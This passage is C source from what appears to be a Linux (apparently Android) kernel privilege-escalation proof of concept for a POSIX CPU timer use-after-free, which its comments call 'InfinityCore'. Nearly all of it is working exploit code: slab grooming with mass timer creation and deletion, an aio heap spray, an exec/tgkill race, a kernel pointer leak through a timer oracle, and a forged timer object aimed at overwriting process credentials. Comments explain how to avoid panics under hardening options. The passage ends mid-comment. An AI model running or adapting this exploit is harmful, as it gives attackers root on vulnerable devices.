	*(uint64_t *)(fake_timer + OFF_KITIMER_IT_CPU + 0x18) = 0;
	*(uint64_t *)(fake_timer + OFF_KITIMER_IT_CPU + 0x20) = head;

	if (cross_page) {
		ic_broadcast_u64(spray, 0xf30, 1);
		ic_broadcast_u32(spray, 0xf40, 0);
		ic_broadcast_u64(spray, 0xf68, 1);
		ic_broadcast_u64(spray, 0xfe0, fake_cred_addr);
		ic_broadcast_u64(spray, 0xfe8, 0);
		ic_broadcast_u64(spray, 0xff0, cred_slot);
		*(uint64_t *)(marker_page + 0x00) = head;
		*(unsigned char *)(marker_page + 0x20) = 0;
		*(unsigned char *)(marker_page + 0x21) = 0;
		*(uint64_t *)(marker_page + 0x28) = 0;
		atomic_thread_fence(memory_order_release);
		ic_broadcast_u64(spray, 0xff8, 0);
	} else {
		*(uint32_t *)(user_object + 0x20) = 1;   /* it_lock */
		*(uint32_t *)(user_object + 0x30) = 1;   /* it_clock */
		*(uint32_t *)(user_object + 0x40) = 0;
		*(uint64_t *)(user_object + 0x54) = 1;   /* SIGEV_NONE */
		*(uint64_t *)(user_object + OFF_KITIMER_IT_CPU) = fake_cred_addr;
		*(uint64_t *)(user_object + OFF_KITIMER_IT_CPU + 8) = 0;
		*(uint64_t *)(user_object + OFF_KITIMER_IT_CPU + 0x10) = cred_slot;
		*(uint64_t *)(user_object + OFF_KITIMER_IT_CPU + 0x20) = head;
		*(unsigned char *)(user_object + 0xb8) = 0;
		*(unsigned char *)(user_object + 0xb9) = 0;
		*(uint64_t *)(user_object + 0xc0) = 0;
		atomic_thread_fence(memory_order_release);
		*(uint64_t *)(user_object + 0xf8) = 0;
	}

	return 0;
}

static int ic_run_stage1(struct ic_timer_oracle *oracle,
			 struct ic_aio_spray *spray)
{
	struct timespec start, now, sample;
	struct timespec pause = { .tv_nsec = 1000000 };
	struct timespec poll_pause = { .tv_nsec = 50000 };
	unsigned char *object = NULL;
	unsigned char *marker_page = NULL, *elist = NULL;
	uint64_t task = 0, stack_link = 0, direct_elist = 0, kernel_object;
	uint64_t future;
	unsigned int batch_first = 0, batch_last = 0;
	unsigned int winner = UINT_MAX;
	unsigned int tries;
	int cross_page = 0;

	if (clock_gettime(CLOCK_MONOTONIC, &start))
		return -1;

	for (;;) {
		int batch_done = 1;
		unsigned int i;

		if (batch_first == batch_last) {
			if (batch_last >= oracle->thread_count)
				break;
			batch_first = batch_last;
			batch_last += IC_ORACLE_BATCH;
			if (batch_last > oracle->thread_count)
				batch_last = oracle->thread_count;
			for (i = batch_first; i < batch_last; i++) {
				atomic_store_explicit(&oracle->workers[i].go, 1,
						      memory_order_release);
				ic_futex_wake_priv(&oracle->workers[i].go, 1);
			}
		}
		for (i = 0; i < spray->count && !object; i++) {
			unsigned char *page = spray->pages[i];
			size_t off;

			for (off = 0; off + SIZEOF_KITIMER <= IC_PAGE;
			     off += 0x108) {
				uint64_t value = *(volatile uint64_t *)
					(page + off + OFF_KITIMER_IT_CPU_HANDLING);

				if (!ic_is_kernel_pointer(value))
					continue;
				task = value;
				marker_page = page;
				cross_page = 0;
				object = page + off;
				elist = object + IC_ELIST_TO_OBJECT_DELTA;
				*(volatile uint32_t *)(object + 0x20) = 1;
				*(volatile uint32_t *)(object + 0x30) = 1;
				*(volatile uint32_t *)(object + 0x54) = 1;
				break;
			}
		}
		if (object)
			break;
		for (i = batch_first; i < batch_last; i++)
			if (!atomic_load_explicit(&oracle->workers[i].done,
						  memory_order_acquire))
				batch_done = 0;
		if (batch_done)
			batch_first = batch_last;
		if (clock_gettime(CLOCK_MONOTONIC, &now))
			return -1;
		if (ic_ts_ns(&now) - ic_ts_ns(&start) >
		    150ULL * 1000 * 1000 * 1000) {
			errno = ETIMEDOUT;
			atomic_store_explicit(&g_stage1_seen, 1,
					      memory_order_release);
			return -1;
		}
	}
	if (!object) {
		errno = ENOENT;
		return -1;
	}

	atomic_store_explicit(&g_stage1_seen, 1, memory_order_release);
	fprintf(stderr, "[ic] stage1 object=%p task=%llx\n"
, (void*)object,
		(unsigned long long)task);
	for (tries = 0; tries < 400000; tries++) {
		unsigned int pending = 0, candidate = UINT_MAX;
		unsigned int i;

		for (i = batch_first; i < batch_last; i++) {
			if (!atomic_load_explicit(&oracle->workers[i].done,
						  memory_order_acquire)) {
				pending++;
				candidate = i;
			}
		}
		if (pending == 1) {
			winner = candidate;
			break;
		}
		if (!pending)
			break;
		nanosleep(&poll_pause, NULL);
	}
	if (winner == UINT_MAX) {
		fprintf(stderr, "[ic] no winner\n"
);
		errno = ETIMEDOUT;
		return -1;
	}

	for (tries = 0; tries < 5000; tries++) {
		uint64_t next = *(volatile uint64_t *)(elist + 0x00);
		uint64_t prev = *(volatile uint64_t *)(elist + 0x08);

		if (next == prev && ic_is_kernel_pointer(next)) {
			stack_link = next;
			break;
		}
		nanosleep(&poll_pause, NULL);
	}
	if (!stack_link) {
		fprintf(stderr, "[ic] no stack_link\n"
);
		if (cross_page)
			ic_broadcast_u8(spray, 0xf40, 0);
		else
			*(volatile uint32_t *)(object + 0x20) = 0;
		errno = ETIMEDOUT;
		return -1;
	}

	if (clock_gettime(oracle->workers[winner].clockid, &sample)) {
		if (cross_page)
			ic_broadcast_u8(spray, 0xf40, 0);
		else
			*(volatile uint32_t *)(object + 0x20) = 0;
		return -1;
	}
	future = ic_ts_ns(&sample) + IC_STAGE1_FUTURE_NS;
	if (cross_page) {
		ic_broadcast_u64(spray, 0xff8, future);
		*(volatile unsigned char *)(marker_page + 0x20) = 0;
	} else {
		*(volatile uint64_t *)(object + 0x90) = future;
		*(volatile unsigned char *)(object + 0xb8) = 0;
	}
	atomic_thread_fence(memory_order_release);

	if (cross_page)
		ic_broadcast_u8(spray, 0xf40, 0);
	else
		*(volatile uint32_t *)(object + 0x20) = 0;

	for (tries = 0; tries < 5000; tries++) {
		uint64_t next = *(volatile uint64_t *)(elist + 0x00);
		uint64_t prev = *(volatile uint64_t *)(elist + 0x08);

		if (next == prev && next != stack_link &&
		    ic_is_kernel_pointer(next)) {
			direct_elist = next;
			break;
		}
		nanosleep(&pause, NULL);
	}
	if (!direct_elist) {
		fprintf(stderr, "[ic] no direct_elist\n"
);
		errno = ETIMEDOUT;
		return -1;
	}

	kernel_object = direct_elist - IC_ELIST_TO_OBJECT_DELTA;
	fprintf(stderr, "[ic] win=%u stack=%llx elist=%llx obj=%llx\n"
,
		winner, (unsigned long long)stack_link,
		(unsigned long long)direct_elist,
		(unsigned long long)kernel_object);
	if (!ic_is_kernel_pointer(kernel_object) ||
	    (cross_page ?
		     ((((kernel_object + 0x100) ^
			(uint64_t)(uintptr_t)marker_page) & 4095) != 0) :
		     (((kernel_object ^ (uint64_t)(uintptr_t)object) & 4095) !=
		      0))) {
		errno = EFAULT;
		return -1;
	}

	for (tries = 0; tries < 5000; tries++) {
		if (atomic_load_explicit(&oracle->workers[winner].done,
					 memory_order_acquire))
			break;
		nanosleep(&pause, NULL);
	}
	if (!atomic_load_explicit(&oracle->workers[winner].done,
				  memory_order_acquire)) {
		errno = ETIMEDOUT;
		return -1;
	}

	if (ic_prepare_stage2(task, kernel_object, object, marker_page,
			      cross_page, spray)) {
		errno = EFAULT;
		return -1;
	}
	atomic_store_explicit(&oracle->workers[winner].stage2_go, 1,
			      memory_order_release);
	ic_futex_wake_priv(&oracle->workers[winner].stage2_go, 1);
	for (tries = 0; tries < 5000; tries++) {
		if (atomic_load_explicit(&oracle->workers[winner].stage2_done,
					 memory_order_acquire))
			break;
		nanosleep(&pause, NULL);
	}

	for (tries = 0;
	     tries < 400 &&
	     !atomic_load_explicit(&g_poc_success, memory_order_acquire);
	     tries++)
		nanosleep(&pause, NULL);
	if (!atomic_load_explicit(&g_poc_success, memory_order_acquire)) {
		errno = ETIMEDOUT;
		return -1;
	}
	return 0;
}

static void ic_destroy_timer_oracle(struct ic_timer_oracle *o)
{
	struct timespec none = { 0 };
	siginfo_t info;
	unsigned int i;

	for (i = 0; i < IC_ORACLE_WORKERS; i++) {
		if (o->workers[i].candidate_created)
			(void)timer_delete(o->workers[i].candidate);
	}
	while (sigtimedwait(&o->signal_set, &info, &none) >= 0)
		;
	for (i = 0; i < o->thread_count; i++) {
		struct ic_oracle_worker *w = &o->workers[i];

		atomic_store_explicit(&w->stop, 1, memory_order_release);
		ic_futex_wake_priv(&w->go, 1);
		ic_futex_wake_priv(&w->stage2_go, 1);
		ic_futex_wake_priv(&w->stop, 1);
		(void)pthread_join(w->thread, NULL);
	}
}

static int ic_recycle_victim(void)
{
	struct sigevent ev;
	int ids[IC_RCU_RECLAIM_FILLERS];
	int made = 0;
	int i;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (i = 0; i < IC_RCU_RECLAIM_FILLERS; i++) {
		ids[i] = -1;
		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev, &ids[i]))
			break;
		made++;
	}
	for (i = 0; i < made; i++)
		if (syscall(SYS_timer_delete, ids[i]))
			return -1;
	return made == IC_RCU_RECLAIM_FILLERS ? 0 : -1;
}

static int ic_create_release_timers(struct ic_release_timers *t)
{
	struct sigevent ev;
	unsigned int i;

	memset(t, 0, sizeof(*t));
	for (i = 0; i < IC_RCU_RELEASE_TIMERS; i++)
		t->ids[i] = -1;
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (i = 0; i < IC_RCU_RELEASE_TIMERS; i++) {
		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev, &t->ids[i]))
			return -1;
		t->count = i + 1;
	}
	return 0;
}

static int ic_delete_release_range(struct ic_release_timers *t,
				   unsigned int first, unsigned int last)
{
	unsigned int i;

	if (last > t->count)
		last = t->count;
	for (i = first; i < last; i++) {
		if (t->ids[i] < 0)
			continue;
		if (syscall(SYS_timer_delete, t->ids[i]))
			return -1;
		t->ids[i] = -1;
	}
	return 0;
}

static int ic_create_slab_padding(int *ids)
{
	struct sigevent ev;
	unsigned int i;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (i = 0; i < IC_SLAB_PADDING_TIMERS; i++) {
		ids[i] = -1;
		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev, &ids[i]))
			return -1;
	}
	return 0;
}

static int ic_delete_slab_padding(int *ids)
{
	unsigned int i;
	unsigned int total = IC_SLAB_PADDING_TIMERS;
	unsigned int guard, keep_start;

	if (g_pad_skip > total)
		g_pad_skip = total;
	guard = total - g_pad_skip;	/* delete [guard, total) */
	if (g_pad_keep > guard)
		g_pad_keep = guard;
	keep_start = guard - g_pad_keep;	/* keep [keep_start, guard) */

	if (!keep_start && guard >= total)
		return 0;
	/* Old ids first: the slabs they empty are the ones furthest from X. */
	for (i = 0; i < keep_start; i++) {
		if (ids[i] < 0)
			continue;
		if (syscall(SYS_timer_delete, ids[i]))
			return -1;
		ids[i] = -1;
	}
	/* Then the newest guard ids, i.e. the padding objects that still sit
	 * in X's slab (or the slab next to it). */
	for (i = guard; i < total; i++) {
		if (ids[i] < 0)
			continue;
		if (syscall(SYS_timer_delete, ids[i]))
			return -1;
		ids[i] = -1;
	}
	return 0;
}

static int ic_create_flush_timers(int *ids)
{
	struct sigevent ev;
	unsigned int i;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (i = 0; i < IC_FLUSH_TIMERS; i++) {
		ids[i] = -1;
		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev, &ids[i])) {
			fprintf(stderr, "[peak] flush create %u/%d errno=%d\n",
				i, IC_FLUSH_TIMERS, errno);
			return -1;
		}
	}
	return 0;
}

/* Every live POSIX timer owns a sigqueue allocation (alloc_posix_timer()
 * calls sigqueue_alloc() even for SIGEV_NONE), and __sigqueue_alloc() refuses
 * once the real uid's pending count passes RLIMIT_SIGPENDING.  So the live
 * timer count is a per-uid, system-wide budget: ~44145 slots for uid 2000
 * here.  A parked attempt that keeps its ~4185 padding timers alive starves
 * every later attempt -- run16's attempt 6 reached the supported L=0xa0 case
 * and then died in timer_create() ("triggers failed") because the six parked
 * attempts were still holding their pads.
 *
 * The padding and flush timers have done their work once X is in our spray:
 * X's slab was discarded and is now a kmalloc-256 slab owned by the psl, so
 * deleting posix timers cannot touch it.  Release every surviving id of both
 * arrays (deleted ones are already -1). */
static void ic_release_pad_timers(int *pad, int *flush)
{
	unsigned int i;

	if (pad) {
		for (i = 0; i < IC_SLAB_PADDING_TIMERS; i++) {
			if (pad[i] < 0)
				continue;
			(void)syscall(SYS_timer_delete, pad[i]);
			pad[i] = -1;
		}
	}
	if (flush) {
		for (i = 0; i < IC_FLUSH_TIMERS; i++) {
			if (flush[i] < 0)
				continue;
			(void)syscall(SYS_timer_delete, flush[i]);
			flush[i] = -1;
		}
	}
}

/* ic_peak_attempt's padding/flush arrays are stack storage; these point at
 * them so the mcast chain and the park path can hand the RLIMIT_SIGPENDING
 * slots back.  Every caller lives inside ic_peak_attempt. */
static int *g_peak_pad_ids;
static int *g_peak_flush_ids;

static void ic_peak_release_pads(void)
{
	if (!g_peak_pad_ids && !g_peak_flush_ids)
		return;
	ic_release_pad_timers(g_peak_pad_ids, g_peak_flush_ids);
}

static int ic_delete_flush_timers(int *ids)
{
	unsigned int i, del = g_flush_del;

	if (del > IC_FLUSH_TIMERS)
		del = IC_FLUSH_TIMERS;
	for (i = 0; i < del; i++) {
		if (ids[i] < 0)
			continue;
		if (syscall(SYS_timer_delete, ids[i]))
			return -1;
		ids[i] = -1;
	}
	return 0;
}

/*
 * Post-spray safe fill (IC_SAFE_FILL).
 *
 * If the kmalloc-256 spray did not take X's slab page, B's reap runs
 * timerqueue_del() on whatever now sits at X.  Two states are fatal on this
 * kernel: a free posix_timers object (SLAB_FREELIST_HARDENED stores an
 * obfuscated next pointer at the freepointer offset, so rb_erase walks
 * garbage) and the pre-free pc(X)==X state left by an earlier timerqueue_del
 * (WARN_ON_ONCE in timerqueue_del, and CONFIG_PANIC_ON_OOPS=y turns that into
 * a reboot).
 *
 * Allocating posix timers here reclaims an undiscarded posix_timers slab
 * through the cache's normal partial list; INIT_ON_ALLOC zeroes the object
 * and timer_create()/hrtimer_init() never touches the timerqueue node, so
 * the node at X reads back all-zero.  rb_erase() treats that as case 1a
 * (no children, black, parent NULL) and returns a NULL rebalance node, i.e.
 * a safe erase.  A spray miss then degrades into the regular "[mcast] no
 * leak" attempt failure that the harness can retry, instead of an oops.
 *
 * The timers are deliberately kept until the process exits: deleting one
 * that landed on X would put the object's freepointer back before B's reap.
 */
static int g_safe_fill_ids[IC_SAFE_FILL_MAX];
static unsigned int g_safe_fill_n;

static void ic_safe_fill(void)
{
	struct sigevent ev;
	unsigned int i, ok = 0;

	if (!g_safe_fill)
		return;
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (i = 0; i < g_safe_fill; i++) {
		int id = -1;

		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev, &id)) {
			fprintf(stderr, "[peak] fill stop %u/%u errno=%d\n",
				i, g_safe_fill, errno);
			break;
		}
		g_safe_fill_ids[g_safe_fill_n++] = id;
		ok++;
	}
	fprintf(stderr, "[peak] fill=%u/%u\n", ok, g_safe_fill);
}

/*
 * Once B has been reaped the fill has done its job: if the psl took X, no
 * fill timer sits on X's object, so the ids can be released to hand their
 * RLIMIT_SIGPENDING slots back to the next attempt.  Never call this before
 * the reap (see ic_safe_fill()).
 */
static void ic_safe_fill_release(void)
{
	unsigned int i;

	for (i = 0; i < g_safe_fill_n; i++)
		(void)syscall(SYS_timer_delete, g_safe_fill_ids[i]);
	g_safe_fill_n = 0;
}

static int ic_create_pushers(unsigned int n)
{
	struct sigevent ev;
	unsigned int i;

	if (!n)
		return 0;
	g_pusher_ids = malloc(sizeof(int) * (size_t)n);
	if (!g_pusher_ids)
		return -1;
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (i = 0; i < n; i++) {
		g_pusher_ids[i] = -1;
		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev,
				&g_pusher_ids[i])) {
			fprintf(stderr, "[peak] pusher create %u/%u errno=%d\n",
				i, n, errno);
			g_pusher_count = i;
			return -1;
		}
	}
	g_pusher_count = n;
	return 0;
}

static int ic_delete_pushers(void)
{
	unsigned int i;

	for (i = 0; i < g_pusher_count; i++) {
		if (g_pusher_ids[i] < 0)
			continue;
		if (syscall(SYS_timer_delete, g_pusher_ids[i]))
			return -1;
		g_pusher_ids[i] = -1;
	}
	return 0;
}

static int *g_drain_pool;
static unsigned int g_drain_count;
/* The IC_KEEP_POOL pool outlives its local scope; the ids stay here so a
 * parked attempt can hand the RLIMIT_SIGPENDING slots back. */
static int *g_kept_pool;
static unsigned int g_kept_count;

static int ic_create_drain_pool(void)
{
	struct sigevent ev;
	unsigned int i;

	g_drain_pool = malloc(sizeof(int) * (size_t)IC_DRAIN_POOL_TIMERS);
	if (!g_drain_pool)
		return -1;
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (i = 0; i < IC_DRAIN_POOL_TIMERS; i++) {
		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev,
			    &g_drain_pool[i])) {
			fprintf(stderr, "[peak] pool create stopped at %u errno=%d\n",
				i, errno);
			break;
		}
		g_drain_count = i + 1;
	}
	return g_drain_count ? 0 : -1;
}

static void ic_delete_drain_pool(void)
{
	unsigned int i;

	for (i = 0; i < g_drain_count; i++)
		(void)syscall(SYS_timer_delete, g_drain_pool[i]);
	g_drain_count = 0;
	free(g_drain_pool);
	g_drain_pool = NULL;
}

/* Free the n newest pool timers.  Their slabs are allocated after every
 * flusher slab, i.e. far above X's 64K window, so the discarded blocks
 * cannot merge with X but their partial-slab pushes still drive
 * __unfreeze_partials() past the node's min_partial reserve. */
static void ic_free_pool_tail(unsigned int n)
{
	while (n-- && g_drain_count) {
		g_drain_count--;
		(void)syscall(SYS_timer_delete, g_drain_pool[g_drain_count]);
	}
}

static int ic_prime_pcp(void)
{
	size_t length = (size_t)IC_PCP_PRIME_PAGES * IC_PAGE;
	unsigned char *mapping;
	size_t off;

	mapping = mmap(NULL, length, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping == MAP_FAILED)
		return -1;
	if (madvise(mapping, length, MADV_NOHUGEPAGE)) {
		munmap(mapping, length);
		return -1;
	}
	for (off = 0; off < length; off += IC_PAGE)
		mapping[off] = (unsigned char)(off >> 12);
	if (munmap(mapping, length))
		return -1;
	return 0;
}

static int ic_locker(void *unused)
{
	int prot = PROT_NONE;
	unsigned int slot;

	(void)unused;
	slot = (unsigned int)atomic_fetch_add_explicit(&g_state.locker_cpu, 1,
						       memory_order_acq_rel);
	fprintf(stderr, "[tg] locker wait slot=%u\n", slot);
	ic_pin_cpu_index(slot ? 3 : 1);
	while (!atomic_load_explicit(&g_state.go, memory_order_acquire))
		sched_yield();

	atomic_fetch_add_explicit(&g_state.locker_started, 1,
				  memory_order_acq_rel);
	fprintf(stderr, "[tg] locker started\n");

	while (!atomic_load_explicit(&g_state.stop, memory_order_relaxed)) {
		(void)syscall(SYS_mprotect, g_state.base, g_state.len, prot);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	_exit(0);
}

static int ic_killer(void *unused)
{
	int tid, tgid;

	(void)unused;
	ic_pin_cpu_index(2);
	while (!(tid = atomic_load_explicit(&g_state.exec_tid,
					    memory_order_acquire)))
		sched_yield();
	tgid = atomic_load_explicit(&g_state.target_tgid, memory_order_acquire);
	fprintf(stderr, "[tg] killer armed\n");


	for (;;) {
		long ret = syscall(SYS_tgkill, tgid, tid, 0);

		if (ret < 0 && errno == ESRCH)
			break;
	

		sched_yield();
	}

	(void)syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	atomic_store_explicit(&g_state.stop, 1, memory_order_release);
	_exit(0);
}

static int ic_spawn_vm_helper(int (*fn)(void *))
{
	void *stack = mmap(NULL, IC_HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;

	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + IC_HELPER_STACK, CLONE_VM | SIGCHLD,
		    NULL);
	if (pid < 0) {
		munmap(stack, IC_HELPER_STACK);
		return -1;
	}
	return pid;
}

static int ic_prepare_fragmented_range(void)
{
	const size_t page = (size_t)sysconf(_SC_PAGESIZE);
	size_t len = IC_VMA_COUNT * page;
	void *base;
	int fd;
	unsigned long i;

	fd = (int)syscall(SYS_memfd_create, "vma-page", MFD_CLOEXEC);
	if (fd < 0 || ftruncate(fd, (off_t)page))
		return -1;
	base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;

	for (i = 0; i < IC_VMA_COUNT; i++) {
		void *want = (char *)base + i * page;
		void *got = mmap(want, page, PROT_READ, MAP_SHARED | MAP_FIXED,
				 fd, 0);

		if (got != want)
			return -1;
	}
	close(fd);
	g_state.base = base;
	g_state.len = len;
	return 0;
}

static void *ic_exec_thread(void *unused)
{
	struct sigevent ev;
	struct itimerspec dormant;
	timer_t timerid;
	char *const argv[] = { (char *)"", NULL };
	char *const envp[] = { NULL };

	(void)unused;
	ic_pin_cpu_index(0);
	if (prctl(PR_SET_NAME, "timer-exec", 0, 0, 0))
		_exit(119);
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_SIGNAL;
	ev.sigev_signo = IC_EXEC_SIGNO;
	memset(&dormant, 0, sizeof(dormant));
	dormant.it_value.tv_sec = 3600;

	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &timerid))
		_exit(120);
	fprintf(stderr, "[tg] timer ok\n");

	if (timer_settime(timerid, 0, &dormant, NULL))
		_exit(121);

	atomic_store_explicit(&g_state.exec_tid, (int)ic_raw_gettid(),
			      memory_order_release);
	fprintf(stderr, "[tg] exec_tid set\n");
	atomic_store_explicit(&g_state.go, 1, memory_order_release);
	fprintf(stderr, "[tg] go set\n");


	while (atomic_load_explicit(&g_state.locker_started,
				    memory_order_acquire) < IC_LOCKERS)
		sched_yield();

	for (volatile unsigned long i = 0; i < 5000000UL; i++)
		ic_cpu_relax();
	fprintf(stderr, "[tg] pre execve\n");

	execve("/proc/self/exe", argv, envp);
	_exit(122);
}

static void ic_run_target(void)
{
	pthread_t thread;
	sigset_t set;
	unsigned int i;

	atomic_store_explicit(&g_state.target_tgid, getpid(),
			      memory_order_release);
	if (ic_prepare_fragmented_range())
		_exit(110);
	fprintf(stderr, "[tg] vmas ok\n");

	for (i = 0; i < IC_LOCKERS; i++) {
		int lp = ic_spawn_vm_helper(ic_locker);
		if (lp < 0) _exit(111);
		fprintf(stderr, "[tg] locker pid=%d\n", lp);
	}
	{
		int kp = ic_spawn_vm_helper(ic_killer);
		if (kp < 0) _exit(112);
		fprintf(stderr, "[tg] killer pid=%d\n", kp);
	}
	fprintf(stderr, "[tg] helpers spawned\n");


	sigemptyset(&set);
	sigaddset(&set, IC_EXEC_SIGNO);
	if (pthread_sigmask(SIG_BLOCK, &set, NULL))
		_exit(113);
	if (pthread_create(&thread, NULL, ic_exec_thread, NULL))
		_exit(114);
	fprintf(stderr, "[tg] exec thread created\n");


	for (;;)
		sched_yield();
}

static int ic_wait_zombie_without_reap(pid_t pid, siginfo_t *si)
{
	struct timespec pause = { .tv_nsec = 10000000 };
	int i;

	for (i = 0; i < 3000; i++) {
		memset(si, 0, sizeof(*si));
		if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (si->si_pid == pid)
			return 0;
		nanosleep(&pause, NULL);
	}
	errno = ETIMEDOUT;
	return -1;
}

static void ic_run_launcher(int rfd)
{
	char *const argv[] = { (char *)"timer-poc", NULL };
	char *const envp[] = { NULL };
	char path[144];

	for (;;) {
		ssize_t n = read(rfd, path, sizeof(path) - 1);

		if (n > 0) {
			path[n] = '\0';
			execve(path, argv, envp);
			continue;
		}
		if (n < 0 && errno == EINTR)
			continue;
		_exit(1);
	}
}

static int ic_pick_staging_dir(char *out, size_t len)
{
	static const char *const candidates[] = { "/data/local/tmp", "/dev",
						  "/mnt", "/tmp" };
	size_t i;

	for (i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
		if (access(candidates[i], W_OK | X_OK))
			continue;
		return snprintf(out, len, "%s", candidates[i]) >= (int)len;
	}
	return -1;
}

static int ic_run_attempt(void)
{
	struct timespec grace = { .tv_sec = 3 };
	struct timespec barn_grace = { .tv_sec = 3 };
	struct timespec victim_grace = { .tv_sec = 1 };
	struct timespec drain_grace = { .tv_nsec = 300000000 };
	struct ic_timer_oracle oracle;
	struct ic_aio_spray spray;
	struct ic_release_timers release;
	int spray_ready = 0;
	siginfo_t si;
	pid_t pid;
	int padding[IC_SLAB_PADDING_TIMERS_MAX];
	int status;

	ic_pin_cpu_index(0);
	memset(&g_state, 0, sizeof(g_state));
	memset(&release, 0, sizeof(release));
	memset(&spray, 0, sizeof(spray));
	memset(padding, 0xff, sizeof(padding));
	atomic_store_explicit(&g_stage1_seen, 0, memory_order_relaxed);
	atomic_store_explicit(&g_poc_success, 0, memory_order_relaxed);

	if (ic_stage_helper())
		return -1;
	if (ic_create_slab_padding(padding)) {
		ic_destroy_timer_oracle(&oracle);
		return -1;
	}
	pid = fork();
	if (pid < 0) {
		ic_destroy_timer_oracle(&oracle);
		return -1;
	}
	if (!pid)
		ic_run_target();

	if (ic_setup_timer_oracle(&oracle)) {
		fprintf(stderr, "[ic] oracle setup failed\n");
		ic_destroy_timer_oracle(&oracle);
		return -1;
	}
	fprintf(stderr, "[ic] oracle ready\n");

	if (ic_wait_zombie_without_reap(pid, &si)) {
		fprintf(stderr, "[ic] wait_zombie failed\n"
);
		ic_destroy_timer_oracle(&oracle);
		return -1;
	}
	fprintf(stderr, "[ic] zombie\n"
);

	atomic_store_explicit(&g_state.stop, 1, memory_order_release);

	if (ic_recycle_victim()) {
		fprintf(stderr, "[ic] recycle failed\n"
);
		ic_destroy_timer_oracle(&oracle);
		return -1;
	}
	fprintf(stderr, "[ic] recycled\n"
);
	nanosleep(&grace, NULL);
	if (ic_allocate_oracle_candidates(&oracle)) {
		fprintf(stderr, "[ic] candidates failed\n"
);
		ic_destroy_timer_oracle(&oracle);
		return -1;
	}
	fprintf(stderr, "[ic] candidates\n"
);
	if (waitpid(pid, &status, 0) != pid) {
		fprintf(stderr, "[ic] reap failed\n"
);
		ic_destroy_timer_oracle(&oracle);
		return -1;
	}
	fprintf(stderr, "[ic] reaped (no panic)\n"
);
	fprintf(stderr, "[ic] release timers\n");
	if (ic_create_release_timers(&release))
		goto out;
	fprintf(stderr, "[ic] drain pool\n");
	if (ic_create_drain_pool())
		goto out;
	fprintf(stderr, "[ic] aio prewarm\n");
	if (ic_prewarm_aio_allocator())
		goto out;

	fprintf(stderr, "[ic] barn1\n");
	if (ic_delete_release_range(&release, 0, IC_RCU_BARN_FILLERS))
		goto out;
	nanosleep(&barn_grace, NULL);

	fprintf(stderr, "[ic] barn2\n");
	if (ic_delete_release_range(&release, IC_RCU_BARN_FILLERS,
				    IC_RCU_RELEASE_TIMERS - IC_RCU_DRAIN_KICK))
		goto out;
	nanosleep(&grace, NULL);
	fprintf(stderr, "[ic] barn3\n");
	if (ic_delete_release_range(&release,
				    IC_RCU_RELEASE_TIMERS - IC_RCU_DRAIN_KICK,
				    IC_RCU_RELEASE_TIMERS))
		goto out;
	nanosleep(&barn_grace, NULL);

	fprintf(stderr, "[ic] oracle del\n");
	if (ic_delete_oracle_candidates(&oracle))
		goto out;
	fprintf(stderr, "[ic] padding del\n");
	if (ic_delete_slab_padding(padding))
		goto out;

	nanosleep(&victim_grace, NULL);

	fprintf(stderr, "[ic] pcp prime\n");
	if (ic_prime_pcp())
		goto out;

	ic_delete_drain_pool();
	nanosleep(&drain_grace, NULL);
	fprintf(stderr, "[ic] aio spray begin\n");
	if (ic_allocate_aio_spray(&spray)) {
		fprintf(stderr, "[ic] aio spray failed\n"
);
		spray_ready = 1;
		goto out;
	}
	spray_ready = 1;
	fprintf(stderr, "[ic] spray ready, stage1\n"
);
	if (ic_run_stage1(&oracle, &spray)) {
		fprintf(stderr, "[ic] stage1 failed errno=%d\n"
, errno);
		goto out;
	}
	fprintf(stderr, "[ic] stage1 ok\n"
);

	return 0;
out:
	if (spray_ready) {
		struct timespec aio_recover = { .tv_sec = 2 };

		ic_cleanup_aio_spray(&spray);
		nanosleep(&aio_recover, NULL);
	}
	if (g_helper_fd >= 0) {
		close(g_helper_fd);
		g_helper_fd = -1;
		(void)unlink(g_helper_path);
	}
	if (g_drain_count)
		ic_delete_drain_pool();
	(void)ic_delete_release_range(&release, 0, release.count);
	(void)ic_delete_slab_padding(padding);
	ic_destroy_timer_oracle(&oracle);
	return -1;
}

/* ---------------- reap-path experiment ----------------
 *
 * The InfinityCore bug leaves the freed k_itimer's cpu_timer node linked in
 * the exiting task's posix_cputimers rb-tree.  posix_cpu_timers_exit() runs
 * from release_task() (i.e. when the zombie is reaped) and calls
 * cleanup_timerqueue(), which does timerqueue_del() on the stale node.
 *
 * If the slab page that used to hold the k_itimer has been returned to the
 * buddy allocator and re-allocated as an anonymous user page, we control the
 * node.  With {parent_color=0, rb_right=0, rb_left=T} the erase path becomes:
 *     tmp->__rb_parent_color = pc;      -> 8-byte zero at T
 *     __rb_change_child(..., parent=0)  -> root->rb_node = T   (real root)
 *     RB_CLEAR_NODE(node)               -> node address written at node+0
